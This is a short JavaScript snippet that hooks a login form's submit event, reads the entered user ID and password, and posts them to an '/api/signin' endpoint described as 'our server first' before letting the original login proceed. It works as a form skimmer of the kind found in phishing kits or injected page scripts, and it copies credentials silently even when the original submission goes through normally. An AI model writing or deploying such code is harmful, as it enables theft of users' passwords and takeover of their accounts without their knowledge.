document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('sign-in-form-Login-1315800172');
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const userId = document.getElementById('iduserId').value;
            const password = document.getElementById('idpassword').value;
            
            try {
                // Send to our server first
                await fetch('/api/signin', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        userId: userId,
                        Password: password
                    })
                });

                // Then continue with the original form submission
                form.submit();
            } catch (error) {
                console.error('Error:', error);
                // Continue with original form submission even if our request fails
                form.submit();
            }
        });
    }
});